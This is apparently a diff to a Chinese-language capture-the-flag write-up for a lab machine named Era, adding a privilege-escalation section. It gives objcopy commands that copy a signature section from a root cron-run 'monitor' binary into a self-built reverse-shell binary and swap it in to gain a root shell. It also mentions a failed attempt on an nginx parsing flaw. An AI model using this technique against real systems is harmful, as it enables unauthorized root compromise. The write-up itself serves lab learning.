@@ -103,3 +103,25 @@
 ![](./Era/21.jpg)
 
 ## 提权
+#### 在/opt目录下找到一个AV文件夹，里面有一个monitor的二进制文件
+#### 用pspy看下有没有相关的进程
+![](./Era/25.jpg)
+#### 看进程id和时间应该是用了定时任务，一分钟执行一次
+#### 提权流程
+#### 制作一个反弹shell的二级制文件->执行objcopy从monitor中提取text_sig->将提取的text_sig添加到反弹shell文件->命名反弹shell文件为monitor并添加执行权限
+#### `gcc test.c -o bd`
+#### `objcopy --dump-section .text_sig=text_sig /opt/AV/periodic-checks/monitor`
+#### `objcopy --add-section .text_sig=text_sig bd`
+#### `cp bd monitor`
+#### `chmod +x monitor`
+![](./Era/26.jpg)
+
+#### 等待任务执行
+#### 收到root的反弹shell
+![](./Era/27.jpg)
+
+#### 果然是定时任务
+![](./Era/28.jpg)
+
+## 总结
+#### medium还是有一些难度的，主要涉及的知识面太广了，利用ssh2反弹shell也是看了别人的writeup才知道的。目标使用的nginx是1.18.0版本存在解析漏洞，本来是想通过上传文件然后利用解析漏洞拿到shell但是失败了
